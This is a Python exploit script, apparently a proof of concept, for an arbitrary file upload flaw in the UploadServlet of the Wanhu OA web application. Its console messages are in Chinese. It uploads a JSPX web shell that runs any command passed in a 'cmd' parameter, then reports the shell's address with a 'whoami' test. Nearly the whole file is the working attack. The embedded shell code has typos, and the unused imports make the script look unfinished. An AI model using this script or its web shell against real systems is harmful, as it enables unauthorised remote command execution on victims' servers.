import time
import requests
import urllib3
from rich.console import Console    
import argparse
import multiprocessing
console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Accept": "*/*", 
        "Content-Type": "multipart/form-data; boundary=-------------------------f6f5e12ed2e08256",
        }
    exp_url = target_url+"defaultroot/UploadServlet"
    data='''-------------------------f6f5e12ed2e08256
Disposition: form-data; name="path"

test
-------------------------f6f5e12ed2e08256
Content-Disposition:form-data; name="fileId"


123456.jspx
-------------------------f6f5e12ed2e08256
Content-Disposition: form-data; name="img"; filename="1.txt'
Content-Type: text/plain

<jsp:root version="2.0” xmlns:jsp="http://java.sun.com/JSP/Page"><jsp:directive.page import="java.io.*"/>
<jsp:scriptlet> String cmd = request.getParameter("cmd"); String output = "";if(cmd != null) { String s=null; try { Process p = Runtime.getRuntime().exec(cmd);BufferedReader sI = new BufferedReader(newInputStreamReader(p.getInputStream())); while((s = sI.readline()) != null) { output += s +"\r\n";}} catch(IOException e) {e.printStackIrace();}}</jsp:scriptlet><jsp:expression>output</jsp:expression></jsp:root>
-------------------------f6f5e12ed2e08256--'''
    
    data=data.encode("utf-8").decode("latin1")
    console.print(now_time() + " [INFO]     正在检测万户OA_UploadServlet 任意文件上传漏洞", style='bold blue')
    shell_url=target_url+'defaultroot/upload/test/123456/123456.jspx?cmd=whoami'
    try:
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if "123456.jspx" in upload.text:
            console.print(now_time() + ' [SUCCESS]  上传webshell成功，利用地址:{}'.format(shell_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  万户OA_UploadServlet 任意文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
        

            
        

            
            
